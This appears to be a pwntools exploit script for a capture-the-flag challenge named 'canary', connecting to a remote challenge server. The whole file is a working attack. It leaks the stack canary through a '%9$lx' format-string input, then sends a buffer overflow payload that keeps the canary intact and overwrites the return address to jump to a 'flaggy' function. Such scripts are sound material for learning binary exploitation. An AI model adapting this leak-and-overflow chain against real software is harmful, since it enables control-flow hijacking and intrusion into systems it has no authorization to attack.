from pwn import *

BIN = './canary'
context.binary = BIN

e = ELF(BIN)
p = remote('141.85.224.106', '31342')

canary_value_expose_string_formatter = b'%9$lx'

p.recvline() # Skip the 'Hello,\n' line
p.recvline() # Skip the 'Welcome to CNS CTF\n' line
p.recvline() # Skip the 'Do you want to continue? [y/n]\n' line

p.sendline(canary_value_expose_string_formatter + b'y')

response = p.recvline() # Get the 'You chose <canary_value>\n' line
p.recvline() # Skip the 'I don't think that is the correct choice. Try again.\n' line
p.recvline() # Skip the 'Do you want to continue? [y/n]\n' line

canary_value = int(response.split(b' ')[2].strip()[:-1], 16)
buffer_offset_without_canary = 0x20 - 0x8
old_rbp_offset = 0x8
flaggy_address = e.symbols['flaggy']

payload = b'y'
payload += b'A' * (buffer_offset_without_canary - 1)
payload += p64(canary_value)
payload += b'B' * old_rbp_offset
payload += p64(flaggy_address)

p.sendline(payload)

p.recvline() # Skip the 'You chose <payload>\n' line
p.recvline() # Skip the 'I don't think that is the correct choice. Try again.\n' line
p.recvline() # Skip the 'Do you want to continue? [y/n]\n' line

p.sendline(b'n')

p.recvline() # Skip the 'Okay then, goodbye!\n' line
p.recvline() # Skip the 'Good job! Here\'s your flag\n' line

p.interactive()
